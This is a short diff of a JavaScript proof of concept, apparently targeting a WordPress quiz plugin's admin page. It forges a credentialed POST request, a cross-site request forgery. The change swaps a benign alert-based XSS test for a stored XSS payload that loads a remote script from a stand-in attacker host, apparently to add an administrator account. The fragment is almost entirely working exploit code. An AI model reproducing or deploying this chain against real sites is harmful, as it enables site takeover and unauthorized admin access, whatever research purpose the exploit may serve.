@@ -16,7 +16,7 @@
             request.open("POST", "http://127.0.0.1:8000/wp-admin/admin.php?page=mlw_quiz_options&quiz_id=1");
             request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
             request.withCredentials = true;
-            request.send("question_type=0&question_name=xssex<img+src=x+onerror=alert(origin)>&correct_answer_info=&hint=&comments=1&new_question_order=1&required=0&new_new_category=&new_question_answer_total=0&question_submission=new_question&quiz_id=1&question_id=0");
+            request.send("question_type=0&question_name=addadminxssex<script+src=http://attacker.zi:5500/addAdminex.js><\/script>&correct_answer_info=&hint=&comments=1&new_question_order=1&required=0&new_new_category=&new_question_answer_total=0&question_submission=new_question&quiz_id=1&question_id=0");
             console.log(`DONE!`);
         }
         window.onload = function() {
